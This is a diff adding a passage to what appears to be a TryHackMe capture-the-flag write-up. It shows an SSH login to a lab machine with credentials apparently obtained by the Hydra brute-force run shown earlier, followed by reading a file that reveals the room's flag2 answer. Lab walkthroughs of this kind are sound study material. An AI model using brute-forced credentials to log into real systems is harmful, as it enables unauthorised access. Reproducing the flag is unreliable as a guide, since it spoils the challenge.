@@ -160,3 +160,47 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-26 15:23:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-26 15:23:37
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/5f8f9b50-2ea5-4c89-803c-36876f8de76c/image.png)
+
+> ssh molly@10.201.106.187
+
+┌──(root㉿docker-desktop)-[/]
+└─# ssh molly@10.201.106.187
+The authenticity of host '10.201.106.187 (10.201.106.187)' can't be established.
+ED25519 key fingerprint is SHA256:o+KrIwA4fu2ZLvn6K+ivm/ebLoxmxWjs3E+vfs2Xvug.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.201.106.187' (ED25519) to the list of known hosts.
+molly@10.201.106.187's password:
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1083-aws x86_64)
+
+- Documentation: https://help.ubuntu.com
+- Management: https://landscape.canonical.com
+- Support: https://ubuntu.com/pro
+
+System information as of Fri 26 Sep 2025 03:28:38 PM UTC
+
+System load: 0.0 Processes: 108
+Usage of /: 18.3% of 14.47GB Users logged in: 0
+Memory usage: 18% IPv4 address for ens5: 10.201.106.187
+Swap usage: 0%
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+7 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
+molly@ip-10-201-106-187:~$
+
+Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
+molly@ip-10-201-106-187:~$ ls
+flag2.txt
+molly@ip-10-201-106-187:~$ cat flag2.txt
+THM{c8eeb0468febbadea859baeb33b2541b}
+molly@ip-10-201-106-187:~$
